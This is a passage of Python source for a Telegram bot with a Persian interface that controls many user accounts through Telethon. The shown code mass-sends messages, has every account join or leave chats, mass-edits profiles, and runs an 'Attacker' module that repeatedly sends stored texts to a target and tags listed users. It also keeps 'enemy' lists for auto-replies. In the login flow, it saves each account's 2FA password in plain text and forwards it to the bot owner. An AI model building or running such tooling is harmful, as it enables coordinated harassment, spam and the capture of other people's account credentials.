                      Button.inline("📋 Menu", b"g_home")]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"gprfdelphoto_(.+)")))
    async def g_profile_delphoto(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      meta = managed.get(sess)
      if not meta:
          return await event.answer(" آفلاین")
      await event.answer(" در حال حذف...")
      try:
          from telethon.tl.functions.photos import GetUserPhotosRequest, DeletePhotosRequest
          from telethon.tl.types import InputPhoto
          result = await meta["client"](GetUserPhotosRequest(
              user_id="me", offset=0, max_id=0, limit=100))
          photos = result.photos
          if not photos:
              await sp_edit(event, f" {sess} عکس پروفایلی نداره.",
                             buttons=[[Button.inline("🔙 Back", f"gprf_{sess}".encode())]])
              return
          input_photos = [
              InputPhoto(id=p.id, access_hash=p.access_hash,
                           file_reference=p.file_reference)
              for p in photos
          ]
          await meta["client"](DeletePhotosRequest(id=input_photos))
          await sp_edit(event, f" {len(photos)} عکس پروفایل {sess} حذف شد.",
                         buttons=[[Button.inline("🔙 Back", f"gprf_{sess}".encode())]])
      except Exception as e:
          await sp_edit(event, f" خطا: {e}",
                         buttons=[[Button.inline("🔙 Back", f"gprf_{sess}".encode())]])

    @bot.on(events.CallbackQuery(pattern=b"gprfname_(.+)"))
    async def g_prfname_prompt(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      group_pending[event.sender_id] = {"step": "prfname", "sess": sess, "group": group_name}
      await sp_edit(event, f" نام جدید برای {sess}:\n(نام نام_خانوادگی — جدا با اسپیس)",
                     buttons=[[Button.inline("❌ Cancel", f"gprf_{sess}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=b"gprfbio_(.+)"))
    async def g_prfbio_prompt(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      group_pending[event.sender_id] = {"step": "prfbio", "sess": sess, "group": group_name}
      await sp_edit(event, f" بیو جدید برای {sess}:\n(حداکثر 70 کاراکتر)",
                     buttons=[[Button.inline("❌ Cancel", f"gprf_{sess}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=b"gprfphoto_(.+)"))
    async def g_prfphoto_prompt(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      group_pending[event.sender_id] = {"step": "prfphoto", "sess": sess, "group": group_name}
      await sp_edit(event, f" Photo پروفایل جدید برای {sess}:\nعکس رو اینجا بفرست:",
                     buttons=[[Button.inline("❌ Cancel", f"gprf_{sess}".encode())]])
      await event.answer()

    # ═══════════════════════════════════════════════════════════
    # GROUP BOT: SETTINGS PANEL
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(data=b"g_settings"))
    async def g_settings_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sessions = grp_sessions()
      rows = [[Button.inline(f"🗂 {'🟢' if s in managed else '🔴'} {s}", f"gset_{s}".encode())]
              for s in sessions]
      rows.append([Button.inline("🔙 Back", b"g_home")])
      await sp_edit(event, " Settings — اکانت رو انتخاب کن:", buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=b"gset_(.+)"))
    async def g_settings_sess(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      if sess not in grp_sessions():
          return await event.answer("")
      meta = managed.get(sess)
      at = meta["state"].get("autotyping", False) if meta else False
      ar2 = meta["state"].get("autorecord", False) if meta else False
      ba = meta["state"].get("bot_active", True) if meta else False
      txt = (
          f" Settings — {sess}\n━━━━━━━━━━━━━━\n"
          f"اتو تایپینگ: {'✅' if at else '❌'}\n"
          f"اتو رکورد: {'✅' if ar2 else '❌'}\n"
          f"ربات فعال: {'✅' if ba else '❌'}"
      )
      await sp_edit(event, txt, buttons=[
          [Button.inline(f"🔘 {'⏹' if at else ''} Typing", f"gsettgl_typing_{sess}".encode()),
             Button.inline(f"🔘 {'⏹' if ar2 else ''} Record", f"gsettgl_record_{sess}".encode())],
          [Button.inline(f"🔴 {'⏹ Off' if ba else ' On'} Bot", f"gsettgl_bot_{sess}".encode())],
          [Button.inline("🔙 Back", b"g_settings")],
      ])
      await event.answer()

    for _gkey in ["typing", "record", "bot"]:
      @bot.on(events.CallbackQuery(pattern=re.compile(rb"gsettgl_" + _gkey.encode() + rb"_(.+)")))
      async def g_settgl_cb(event, __key=_gkey):
          if not grp_guard(event):
              return await event.answer()
          sess = event.pattern_match.group(1).decode()
          meta = managed.get(sess)
          if not meta:
              return await event.answer(" آفلاین")
          field_map = {"typing": "autotyping", "record": "autorecord", "bot": "bot_active"}
          field = field_map[__key]
          meta["state"][field] = not meta["state"].get(field, False)
          save_session_state(sess, meta["state"])
          st = "✅" if meta["state"][field] else "❌"
          await event.answer(f"{__key} → {st}")
          await sp_edit(event, f" {sess} — {__key}: {st}",
                         buttons=[[Button.inline("🔙 Back", f"gset_{sess}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"gdone_(.+)")))
    async def g_done_btn(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      uid = event.sender_id
      pend = group_pending.pop(uid, {})
      step = pend.get("step", "")
      meta = managed.get(sess)

      if step in ("self_text", "self_upload_text"):
          cnt = len(meta["state"].get("self_reply_text", [])) if meta else 0
          if meta:
              save_session_state(sess, meta["state"])
          await sp_edit(event, f" {cnt} متن Self ثبت شد.",
                         buttons=[[Button.inline(f"🗂 {sess}", f"gen_{sess}".encode()),
                                   Button.inline("📋 Menu", b"g_home")]])
      elif step.startswith("self_upload_"):
          cnt = len(meta["state"].get("self_reply_media", [])) if meta else 0
          if meta:
              save_session_state(sess, meta["state"])
          await sp_edit(event, f" {cnt} مدیا Self ثبت شد.",
                         buttons=[[Button.inline(f"🗂 {sess}", f"gen_{sess}".encode()),
                                   Button.inline("📋 Menu", b"g_home")]])
      else:
          await event.answer(" تموم شد")
          await sp_edit(event, " عملیات پایان یافت.",
                         buttons=[[Button.inline("📋 Menu", b"g_home")]])

    # ═══════════════════════════════════════════════════════════
    # GROUP BOT: GROUP IDs PANEL
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(data=b"g_groupids"))
    async def g_groupids_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sessions = grp_sessions()
      rows = [[Button.inline(f"🗂 {'🟢' if s in managed else '🔴'} {s}", f"ggids_{s}".encode())]
              for s in sessions]
      rows.append([Button.inline("🔙 Back", b"g_home")])
      await sp_edit(event,
          " Group IDs\n"
          "━━━━━━━━━━━━━━\n"
          "اکانت رو انتخاب کن تا لیست گروه‌هاش نشون داده بشه.\n"
          "با زدن روی هر گروه، آیدی عددیش اینجا فرستاده می‌شه:",
          buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"ggids_(.+)")))
    async def g_groupids_sess(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      meta = managed.get(sess)
      if not meta:
          return await event.answer(" اکانت آفلاینه")
      await event.answer(" در حال دریافت گروه‌ها...")
      try:
          dialogs = await meta["client"].get_dialogs()
          groups = [(d.title, d.id) for d in dialogs
                      if hasattr(d.entity, 'megagroup') or hasattr(d.entity, 'broadcast')
                      or (hasattr(d.entity, 'left') and not d.is_user)]
          if not groups:
              groups = [(d.title, d.id) for d in dialogs if not d.is_user]
      except Exception as e:
          return await sp_edit(event, f" خطا: {e}",
                                buttons=[[Button.inline("🔙 Back", b"g_groupids")]])
      rows = []
      for title, gid in groups[:30]:
          rows.append([Button.inline(f"🔘 {'📢' if gid < 0 else '👤'} {title[:25]}",
              f"ggid_send_{sess}|{gid}".encode())])
      rows.append([Button.inline("🔙 Back", b"g_groupids")])
      await sp_edit(event,
          f" گروه‌های {sess}\n"
          f"━━━━━━━━━━━━━━\n"
          f"تعداد: {len(groups)}\n"
          f"روی هر گروه بزن تا آیدیش ارسال بشه:",
          buttons=rows)

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"ggid_send_([^|]+)\|(.+)")))
    async def g_groupid_send(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      gid_str = event.pattern_match.group(2).decode()
      await sp(event.chat_id, f"`{gid_str}`",
              buttons=[[Button.inline("🔙 Back", f"ggids_{sess}".encode())]])
      await event.answer(" آیدی ارسال شد")

    # ── admins panel ──────────────────────────────────────────
    @bot.on(events.CallbackQuery(data=b"g_admins"))
    async def g_admins_cb(event):
      if not grp_owner_guard(event):
          return await event.answer(" فقط اونر گروه میتونه ادمین مدیریت کنه")
      admins = groups_db.get(group_name, {}).get("bot_admins", [])
      owner_uid = grp_owner_id()
      txt = (
          f" Adminsی ربات گروه {group_name}:\n"
          f"اونر: {owner_uid}\n"
          f"━━━━━━━━━━━\n" +
          ("\n".join(f"• {a}" for a in admins) if admins else "— هیچ ادمینی —")
      )
      buttons = [
          [Button.inline("➕ Add Admin", b"gadm_add"),
             Button.inline("🗑 Remove Admin", b"gadm_del")],
          [Button.inline("📌 Clear All Admins", b"gadm_clr"),
             Button.inline("🔙 Back", b"g_home")],
      ]
      await sp_edit(event, txt, buttons=buttons)
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gadm_add"))
    async def g_adm_add_prompt(event):
      if not grp_owner_guard(event):
          return await event.answer(" فقط اونر")
      group_pending[event.sender_id] = {"step": "adm_add", "group": group_name}
      await sp_edit(event, " آیدی عددی ادمین جدید:",
                     buttons=[[Button.inline("❌ Cancel", b"g_admins")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gadm_del"))
    async def g_adm_del_prompt(event):
      if not grp_owner_guard(event):
          return await event.answer(" فقط اونر")
      group_pending[event.sender_id] = {"step": "adm_del", "group": group_name}
      await sp_edit(event, " آیدی ادمینی که می‌خوای حذف کنی:",
                     buttons=[[Button.inline("❌ Cancel", b"g_admins")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gadm_clr"))
    async def g_adm_clr(event):
      if not grp_owner_guard(event):
          return await event.answer(" فقط اونر")
      groups_db.setdefault(group_name, {})["bot_admins"] = []
      save_groups()
      await sp_edit(event, f" همه ادمین‌های {group_name} پاک شدن.",
                     buttons=[[Button.inline("🔙 Back", b"g_admins")]])
      await event.answer()

    # ── status panel ──────────────────────────────────────────
    @bot.on(events.CallbackQuery(data=b"g_status"))
    async def g_status_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sessions = grp_sessions()
      online = sum(1 for s in sessions if s in managed)
      admins_cnt = len(groups_db.get(group_name, {}).get("bot_admins", []))
      txt = (
          f" Status گروه: {group_name}\n"
          f"━━━━━━━━━━━━━━━━━━━━\n"
          f" کل اکانت‌ها: {len(sessions)}\n"
          f" آنلاین: {online}  |   آفلاین: {len(sessions)-online}\n"
          f" Adminsی ربات: {admins_cnt}"
      )
      await sp_edit(event, txt, buttons=[[Button.inline("🔙 Back", b"g_home")]])
      await event.answer()

    # ── unified text handler ──────────────────────────────────
    @bot.on(events.NewMessage())
    async def g_text_handler(event):
      if not grp_guard(event):
          return
      text = event.text.strip() if event.text else ""
      uid = event.sender_id
      pend = group_pending.get(uid, {})

      # only handle if this pending state belongs to this group's bot
      if not pend or pend.get("group") != group_name:
          return

      # delete the user's input message to keep chat clean (single panel)
      try:
          await event.delete()
      except Exception:
          pass

      PASS_THROUGH_CMDS = {"/done", "/skip", "/cancel"}
      if text.startswith("/") and text not in PASS_THROUGH_CMDS:
          group_pending.pop(uid, None)
          return

      step = pend.get("step", "")

      # ── /cancel در هر مرحله ───────────────────────────────
      if text == "/cancel":
          group_pending.pop(uid, None)
          await sp(event.chat_id, " Cancel شد.",
                    buttons=[[Button.inline("📋 Menu", b"g_home")]])
          return

      # ── account add: phone ────────────────────────────────
      if step == "phone":
          phone = text
          sess = generate_next_session_name()
          tmp = _make_client(sess_path(sess), session_name=sess)
          try:
              await tmp.connect()
              await tmp.send_code_request(phone)
          except Exception as e:
              await sp(event.chat_id, f" خطا: {e}",
                        buttons=[[Button.inline("🔙 Back", b"g_accounts")]])
              group_pending.pop(uid, None)
              try:
                    await tmp.disconnect()
              except Exception:
                    pass
              return
          pending_logins[phone] = {"tmp": tmp, "session": sess, "sender": uid, "phone": phone}
          group_pending[uid] = {"step": "code", "phone": phone, "sess": sess, "group": group_name}
          await sp(event.chat_id, f" کد به {phone} ارسال شد.\nحالا کد رو بنویس:",
                    buttons=[[Button.inline("❌ Cancel", b"g_accounts")]])
          return

      # ── account add: code ─────────────────────────────────
      if step == "code":
          phone = pend.get("phone", "")
          pend_login = pending_logins.get(phone)
          if not pend_login:
              await sp(event.chat_id, " جلسه لاگین منقضی شده.",
                        buttons=[[Button.inline("📋 Menu", b"g_home")]])
              group_pending.pop(uid, None)
              return
          tmp = pend_login["tmp"]
          sess = pend_login["session"]
          try:
              await tmp.sign_in(phone=phone, code=text)
          except SessionPasswordNeededError:
              group_pending[uid] = {"step": "2fa", "phone": phone, "sess": sess, "group": group_name}
              await sp(event.chat_id, " رمز 2FA رو بنویس:",
                        buttons=[[Button.inline("❌ Cancel", b"g_accounts")]])
              return
          except Exception as e:
              await sp(event.chat_id, f" خطا در کد: {e}",
                        buttons=[[Button.inline("🔙 Back", b"g_accounts")]])
              group_pending.pop(uid, None)
              return
          group_pending.pop(uid, None)
          pending_logins.pop(phone, None)
          await _finalize_group_account(bot, sp, event.chat_id, tmp, sess, phone, group_name)
          return

      # ── account add: 2FA ──────────────────────────────────
      if step == "2fa":
          phone = pend.get("phone", "")
          sess = pend.get("sess", "")
          pend_login = pending_logins.get(phone)
          if not pend_login:
              await sp(event.chat_id, " جلسه لاگین منقضی شده.",
                        buttons=[[Button.inline("📋 Menu", b"g_home")]])
              group_pending.pop(uid, None)
              return
          tmp = pend_login["tmp"]
          try:
              await tmp.sign_in(password=text)
          except Exception as e:
              await sp(event.chat_id, f" خطا در 2FA: {e}",
                        buttons=[[Button.inline("🔙 Back", b"g_accounts")]])
              group_pending.pop(uid, None)
              return
          if sess in sessions_db:
              sessions_db[sess]["twofa"] = text
              save_db()
          save_2fa_to_file(sess, phone, text)
          group_pending.pop(uid, None)
          pending_logins.pop(phone, None)
          await _finalize_group_account(bot, sp, event.chat_id, tmp, sess, phone, group_name)
          try:
              notif_2fa = f"<spoiler> 2FA جدید ثبت شد\nاکانت: {sess}\n شماره: {phone}\n رمز 2FA: {text}</spoiler>"
              sent = False
              if bot_client:
                    try:
                        await bot_client.send_message(OWNER_ID, notif_2fa, parse_mode="html")
                        sent = True
                    except Exception:
                        pass
              if not sent:
                    try:
                        await bot.send_message(OWNER_ID, notif_2fa, parse_mode="html")
                    except Exception:
                        pass
          except Exception:
              pass
          return

      # ── account display name ───────────────────────────────
      if step == "acc_name":
          sess = pend.get("sess", "")
          group_pending.pop(uid, None)
          if text not in ("/skip", "/cancel"):
              # store display name in sessions_db
              if sess in sessions_db:
                    sessions_db[sess]["display_name"] = text
                    save_db()
              await sp(event.chat_id, f" اسم نمایشی «{text}» برای {sess} ثبت شد.",
                        buttons=[[Button.inline("👤 Accounts", b"g_accounts"),
                                  Button.inline("📋 Menu", b"g_home")]])
          else:
              await sp(event.chat_id, " اسم نمایشی رد شد.",
                        buttons=[[Button.inline("👤 Accounts", b"g_accounts"),
                                  Button.inline("📋 Menu", b"g_home")]])
          return

      # ── second on text ────────────────────────────────────
      if step == "second_on_text":
          sess = pend.get("sess", "")
          meta = managed.get(sess)
          group_pending.pop(uid, None)
          try:
              sot = max(0, int(text))
              if meta:
                    meta["state"]["second_on_text"] = sot
                    save_session_state(sess, meta["state"])
              await sp(event.chat_id, f" second on text {sess} → {sot}s",
                        buttons=[[Button.inline("🔙 Back", b"g_home")]])
          except ValueError:
              await sp(event.chat_id, " عدد صحیح وارد کن",
                        buttons=[[Button.inline("🔙 Back", b"g_home")]])
          return

      # ── attacker: set target ─────────────────────────────
      if step == "atk_target":
          group_pending.pop(uid, None)
          atk = groups_db.setdefault(group_name, {}).setdefault("attacker", {
              "active": False, "target": "", "items": [], "delay": 2})
          atk["target"] = text.strip()
          save_groups()
          await sp(event.chat_id, f" مقصد Attacker تنظیم شد: {text.strip()}",
                    buttons=[[Button.inline("⚔️ Attacker", b"g_atk")]])
          return

      # ── attacker: set delay ───────────────────────────────
      if step == "atk_delay":
          group_pending.pop(uid, None)
          try:
              d = max(1, int(text))
              atk = groups_db.setdefault(group_name, {}).setdefault("attacker", {
                    "active": False, "target": "", "items": [], "delay": 2})
              atk["delay"] = d
              save_groups()
              await sp(event.chat_id, f" تاخیر Attacker: {d} ثانیه",
                        buttons=[[Button.inline("⚔️ Attacker", b"g_atk")]])
          except ValueError:
              await sp(event.chat_id, " عدد صحیح وارد کن",
                        buttons=[[Button.inline("⚔️ Attacker", b"g_atk")]])
          return

      if step == "atk_seqinterval":
          group_pending.pop(uid, None)
          try:
              iv = max(0.1, float(text))
              atk = groups_db.setdefault(group_name, {}).setdefault("attacker", {
                    "active": False, "target": "", "items": [], "delay": 2})
              atk["seq_interval"] = iv
              save_groups()
              await sp(event.chat_id, f"⏱ فاصله Sequential: {iv} ثانیه",
                        buttons=[[Button.inline("⚔️ Attacker", b"g_atk")]])
          except ValueError:
              await sp(event.chat_id, " عدد معتبر وارد کن (مثلاً ۱ یا ۰.۵)",
                        buttons=[[Button.inline("⚔️ Attacker", b"g_atk")]])
          return

      if step == "atk_autostop":
          group_pending.pop(uid, None)
          try:
              h = max(0.0, float(text))
              atk = groups_db.setdefault(group_name, {}).setdefault("attacker", {
                    "active": False, "target": "", "items": [], "delay": 2})
              atk["auto_stop_hours"] = h
              save_groups()
              msg = f"⏰ خاموش خودکار: {h} ساعت" if h else "⏰ خاموش خودکار غیرفعال شد"
              await sp(event.chat_id, msg,
                        buttons=[[Button.inline("⚔️ Attacker", b"g_atk")]])
          except ValueError:
              await sp(event.chat_id, " عدد معتبر وارد کن (مثلاً ۲ یا ۱.۵ یا ۰ برای غیرفعال)",
                        buttons=[[Button.inline("⚔️ Attacker", b"g_atk")]])
          return

      # ── attacker: add text ────────────────────────────────
      if step == "atk_text":
          atk = groups_db.setdefault(group_name, {}).setdefault("attacker", {
              "active": False, "target": "", "items": [], "delay": 2})
          if text == "/done":
              group_pending.pop(uid, None)
              save_groups()
              cnt = sum(1 for i in atk.get("items", []) if i["type"] == "text")
              await sp(event.chat_id, f" {cnt} متن برای Attacker ثبت شد.",
                        buttons=[[Button.inline("⚔️ Attacker", b"g_atk")]])
          else:
              atk.setdefault("items", []).append({"type": "text", "val": text})
              save_groups()
              cnt = sum(1 for i in atk["items"] if i["type"] == "text")
              await sp(event.chat_id, f" متن #{cnt} ثبت شد. ادامه یا /done:")
          return

      # ── send message: target ──────────────────────────────
      if step == "send_target":
          group_pending[uid] = {"step": "send_text", "target": text, "group": group_name}
          await sp(event.chat_id,
              f" حالا متن پیام رو بنویس که با همه اکانت‌های گروه به {text} فرستاده بشه:",
              buttons=[[Button.inline("❌ Cancel", b"g_home")]])
          return

      # ── send message: text ────────────────────────────────
      if step == "send_text":
          target = pend.get("target", "")
          msg_text = text
          group_pending.pop(uid, None)
          ok = fail = 0
          for sess in grp_sessions():
              meta = managed.get(sess)
              if not meta:
                    continue
              try:
                    await meta["client"].send_message(target, msg_text)
                    ok += 1
                    await asyncio.sleep(2)
              except Exception:
                    fail += 1
          await sp(event.chat_id, f" ارسال تموم شد!\n موفق: {ok}\n ناموفق: {fail}",
                    buttons=[[Button.inline("📋 Menu", b"g_home")]])
          return

      # ── join/leave all ────────────────────────────────────
      if step in ("gjoin_all", "gleave_all"):
          target_link = text.strip()
          group_pending.pop(uid, None)
          is_join = step == "gjoin_all"
          ok = fail = 0

          async def do_join_leave(client, link, join):
              from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
              from telethon.tl.functions.messages import ImportChatInviteRequest, DeleteChatUserRequest
              from telethon.tl.types import Chat as _TLChat
              from telethon.errors import UserAlreadyParticipantError, InviteRequestSentError
              link = link.strip().replace("https://", "").replace("http://", "")
              if join:
                    try:
                        if "joinchat/" in link:
                            h = link.split("joinchat/")[-1].lstrip("/").split("?")[0]
                            await client(ImportChatInviteRequest(h))
                        elif link.startswith("t.me/+"):
                            await client(ImportChatInviteRequest(link[6:]))
                        elif link.startswith("+") and not link[1:].isdigit():
                            await client(ImportChatInviteRequest(link.lstrip("+")))
                        else:
                            lnk = "@" + link.split("t.me/")[-1].split("?")[0] if "t.me/" in link else link
                            try:
                                ent = await client.get_entity(lnk)
                                await client(JoinChannelRequest(ent))
                            except (UserAlreadyParticipantError, InviteRequestSentError):
                                pass
                            except Exception:
                                await client(JoinChannelRequest(lnk))
                    except (UserAlreadyParticipantError, InviteRequestSentError):
                        pass
              else:
                    _is_priv = "t.me/+" in link or "joinchat/" in link or (link.startswith("+") and not link[1:].isdigit())
                    lnk = link if _is_priv else ("@" + link.split("t.me/")[-1].split("?")[0] if "t.me/" in link else link)
                    try:
                        ent = await client.get_entity(lnk)
                    except Exception:
                        if _is_priv:
                            raise
                        ent = lnk
                    try:
                        if isinstance(ent, _TLChat):
                            _me = await client.get_me()
                            await client(DeleteChatUserRequest(chat_id=ent.id, user_id=_me.id))
                        else:
                            await client(LeaveChannelRequest(ent))
                    except Exception:
                        if ent != lnk:
                            await client(LeaveChannelRequest(lnk))
                        else:
                            raise

          _g_jl_errors: list = []

          async def _g_jl_one(sess):
              meta = managed.get(sess)
              if not meta:
                    return False
              try:
                    await do_join_leave(meta["client"], target_link, is_join)
                    return True
              except Exception as _e:
                    _g_jl_errors.append(f"{sess}: {str(_e)[:60]}")
                    return False

          _g_results = await asyncio.gather(*[_g_jl_one(s) for s in grp_sessions()], return_exceptions=True)
          ok   = sum(1 for r in _g_results if r is True)
          fail = sum(1 for r in _g_results if r is not True)
          label = "جوین" if is_join else "لفت"
          icon = "🟢" if is_join else "🔴"
          err_txt = ("\n\nخطاها:\n" + "\n".join(_g_jl_errors[:5])) if _g_jl_errors else ""
          await sp(event.chat_id,
              f"{icon} {label} تموم شد!\n✅ موفق: {ok}   ❌ ناموفق: {fail}{err_txt}",
              buttons=[[Button.inline("🔙 Back", b"g_joinleave"),
                          Button.inline("📋 Menu", b"g_home")]])
          return

      # ── join/leave one: show account picker ───────────────
      if step in ("gjoin_one", "gleave_one"):
          target_link = text
          group_pending[uid] = {"step": step + "_pick", "target": target_link, "group": group_name}
          is_join = "join" in step
          action_key = "join" if is_join else "leave"
          sessions = grp_sessions()
          rows = [[Button.inline(f"🗂 {'🟢' if s in managed else '🔴'} {s}",
                        f"gjlpick_{action_key}_{s}".encode())]
                    for s in sessions]
          rows.append([Button.inline("❌ Cancel", b"g_joinleave")])
          label = "جوین" if is_join else "لفت"
          await sp(event.chat_id,
              f"{'🟢' if is_join else '🔴'} {label} به {target_link}\nکدوم اکانت؟",
              buttons=rows)
          return

      # ── ID add ────────────────────────────────────────────
      if step == "idadd":
          sess = pend.get("sess", "")
          meta = managed.get(sess)
          group_pending.pop(uid, None)
          if meta:
              try:
                    uid_add = int(text)
                    meta["state"]["locked_users"].add(uid_add)
                    save_session_state(sess, meta["state"])
                    await sp(event.chat_id, f" آیدی {uid_add} به {sess} اضافه شد.",
                            buttons=[[Button.inline("🔙 Back", f"gids_{sess}".encode())]])
              except ValueError:
                    await sp(event.chat_id, " آیدی باید عدد باشه",
                            buttons=[[Button.inline("🔙 Back", f"gids_{sess}".encode())]])
          return

      # ── ID del ────────────────────────────────────────────
      if step == "iddel":
          sess = pend.get("sess", "")
          meta = managed.get(sess)
          group_pending.pop(uid, None)
          if meta:
              try:
                    uid_del = int(text)
                    meta["state"]["locked_users"].discard(uid_del)
                    save_session_state(sess, meta["state"])
                    await sp(event.chat_id, f" آیدی {uid_del} از {sess} حذف شد.",
                            buttons=[[Button.inline("🔙 Back", f"gids_{sess}".encode())]])
              except ValueError:
                    await sp(event.chat_id, " آیدی باید عدد باشه",
                            buttons=[[Button.inline("🔙 Back", f"gids_{sess}".encode())]])
          return

      # ── Attacker tag add ──────────────────────────────────
      if step == "atk_tag_add":
          if text in ("/done", "/cancel"):
              group_pending.pop(uid, None)
              atk = groups_db.get(group_name, {}).get("attacker", {})
              cnt = len(atk.get("mention_ids", []))
              await sp(event.chat_id, f" {cnt} آیدی در لیست تگ.",
                        buttons=[[Button.inline("🔙 Back", b"gatk_tags")]])
              return
          raw = text.strip()
          atk = groups_db.setdefault(group_name, {}).setdefault("attacker", {
              "active": False, "target": "", "items": [], "delay": 2, "mention_ids": []})
          atk.setdefault("mention_ids", [])
          # normalize: numeric or @username
          try:
              entry = str(int(raw))           # numeric ID — store as string
          except ValueError:
              entry = raw if raw.startswith("@") else f"@{raw}"
          if entry not in [str(x) for x in atk["mention_ids"]]:
              atk["mention_ids"].append(entry)
              save_groups()
          cnt = len(atk["mention_ids"])
          await sp(event.chat_id,
              f" {entry} اضافه شد. (جمع: {cnt})\nادامه یا /done:",
              buttons=[[Button.inline("❌ Cancel", b"gatk_tags")]])
          return

      # ── Attacker tag del ──────────────────────────────────
      if step == "atk_tag_del":
          group_pending.pop(uid, None)
          raw = text.strip()
          atk = groups_db.get(group_name, {}).get("attacker", {})
          ids = atk.get("mention_ids", [])
          try:
              entry = str(int(raw))
          except ValueError:
              entry = raw if raw.startswith("@") else f"@{raw}"
          str_ids = [str(x) for x in ids]
          if entry in str_ids:
              idx_r = str_ids.index(entry)
              ids.pop(idx_r)
              atk["mention_ids"] = ids
              save_groups()
              await sp(event.chat_id, f" {entry} حذف شد.",
                        buttons=[[Button.inline("🔙 Back", b"gatk_tags")]])
          else:
              await sp(event.chat_id, f" {entry} در لیست نیست.",
                        buttons=[[Button.inline("🔙 Back", b"gatk_tags")]])
          return

      # ── enemy add ────────────────────────────────────────
      if step == "enadd":
          sess = pend.get("sess", "")
          meta = managed.get(sess)
          group_pending.pop(uid, None)
          if meta:
              try:
                    try:
                        eid = int(text)
                    except ValueError:
                        uname2 = text.lstrip("@")
                        ent2 = await meta["client"].get_entity(uname2)
                        eid = ent2.id
                    meta["state"].setdefault("locked_auto_reply", set()).add(eid)
                    save_session_state(sess, meta["state"])
                    await sp(event.chat_id, f" دشمن {eid} به {sess} اضافه شد.",
                            buttons=[[Button.inline("🔙 Back", f"gen_{sess}".encode())]])
              except Exception as e:
                    await sp(event.chat_id, f" خطا: {e}",
                            buttons=[[Button.inline("🔙 Back", f"gen_{sess}".encode())]])
          return

      # ── enemy del ────────────────────────────────────────
      if step == "endel":
          sess = pend.get("sess", "")
          meta = managed.get(sess)
          group_pending.pop(uid, None)
          if meta:
              try:
                    eid = int(text)
                    meta["state"].get("locked_auto_reply", set()).discard(eid)
                    save_session_state(sess, meta["state"])
                    await sp(event.chat_id, f" دشمن {eid} از {sess} حذف شد.",
                            buttons=[[Button.inline("🔙 Back", f"gen_{sess}".encode())]])
              except ValueError:
                    await sp(event.chat_id, " آیدی باید عدد باشه",
                            buttons=[[Button.inline("🔙 Back", f"gen_{sess}".encode())]])
          return

      # ── self reply text ───────────────────────────────────
      if step == "enfosh":
          sess = pend.get("sess", "")
          meta = managed.get(sess)
          if not meta:
              group_pending.pop(uid, None)
              await sp(event.chat_id, f" {sess} آفلاینه",
                        buttons=[[Button.inline("🔙 Back", b"g_enemy")]])
              return
          if text == "/done":
              group_pending.pop(uid, None)
              cnt = len(meta["state"].get("self_reply_text", []))
              save_session_state(sess, meta["state"])
              await sp(event.chat_id, f" {cnt} متن Self ثبت شد.",
                        buttons=[[Button.inline(f"🗂 {sess}", f"gen_{sess}".encode()),
                                  Button.inline("📋 Menu", b"g_home")]])
          else:
              meta["state"].setdefault("self_reply_text", []).append(text)
              cnt = len(meta["state"]["self_reply_text"])
              await sp(event.chat_id, f" متن #{cnt} ثبت شد. ادامه یا /done:")
          return

      # ── self text / self_upload_text ──────────────────────
      if step in ("self_text", "self_upload_text"):
          sess = pend.get("sess", "")
          meta = managed.get(sess)
          if not meta:
              group_pending.pop(uid, None)
              await sp(event.chat_id, f" {sess} آفلاینه",
                        buttons=[[Button.inline("🔙 Back", b"g_enemy")]])
              return
          if text == "/done":
              group_pending.pop(uid, None)
              cnt = len(meta["state"].get("self_reply_text", []))
              save_session_state(sess, meta["state"])
              await sp(event.chat_id, f" {cnt} متن ریپلای Self ثبت شد.",
                        buttons=[[Button.inline(f"🗂 {sess}", f"gen_{sess}".encode()),
                                  Button.inline("📋 Menu", b"g_home")]])
          else:
              meta["state"].setdefault("self_reply_text", []).append(text)
              cnt = len(meta["state"]["self_reply_text"])
              save_session_state(sess, meta["state"])
              await sp(event.chat_id, f" متن #{cnt} ثبت شد. ادامه یا /done:")
          return

      # ── profile name all ──────────────────────────────────
      if step == "prfname_all":
          group_pending.pop(uid, None)
          parts = text.split(None, 1)
          fname = parts[0]
          lname = parts[1] if len(parts) > 1 else ""
          ok = fail = 0
          for sess in grp_sessions():
              meta = managed.get(sess)
              if not meta:
                    continue
              try:
                    await meta["client"](functions.account.UpdateProfileRequest(
                        first_name=fname, last_name=lname))
                    ok += 1
                    await asyncio.sleep(2)
              except Exception:
                    fail += 1
          await sp(event.chat_id,
              f" نام همه اکانت‌ها تغییر کرد!\nموفق: {ok}  ناموفق: {fail}",
              buttons=[[Button.inline("🔙 Back", b"gprf_all"),
                          Button.inline("📋 Menu", b"g_home")]])
          return

      # ── profile bio all ───────────────────────────────────
      if step == "prfbio_all":
          group_pending.pop(uid, None)
          ok = fail = 0
          for sess in grp_sessions():
              meta = managed.get(sess)
              if not meta:
                    continue
              try:
                    await meta["client"](functions.account.UpdateProfileRequest(about=text[:70]))
                    ok += 1
                    await asyncio.sleep(2)
              except Exception:
                    fail += 1
          await sp(event.chat_id,
